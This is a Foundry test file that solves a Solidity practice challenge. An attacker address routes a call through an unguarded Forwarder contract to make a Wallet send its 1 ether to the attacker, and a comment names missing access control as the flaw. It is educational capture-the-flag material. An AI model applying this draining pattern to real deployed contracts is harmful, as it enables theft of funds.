// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.15;

import {Test} from "forge-std/Test.sol";
import {Forwarder} from "../../src/solidity-riddles/Forwarder.sol";
import {Wallet} from "../../src/solidity-riddles/Forwarder.sol";

/// @title AttackForwarder_Test
/// @author Surbhi Audichya
contract AttackForwarder_Test is Test {
    Forwarder private forwarder;
    Wallet private wallet;
    address private attacker = makeAddr("attacker");
    uint256 beforeBalance;

    function setUp() public {
        forwarder = new Forwarder();
        wallet = (new Wallet){value: 1 ether}(address(forwarder));
    }

    // Issue: Access Control. Any EOA has the ability to invoke the forwarder contract by specifying the desired destination address and initiating an ether transfer to themselves
    function test_Attack() external {
        beforeBalance = attacker.balance;
        bytes memory data = abi.encodeWithSelector(wallet.sendEther.selector, (attacker), 1 ether);
        vm.prank(attacker);
        forwarder.functionCall(address(wallet), data);
        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 afterBalance = attacker.balance;
        assertEq(afterBalance - beforeBalance, 1 ether);
        assertEq(address(wallet).balance, 0, "Challenge Incomplete");
    }
}
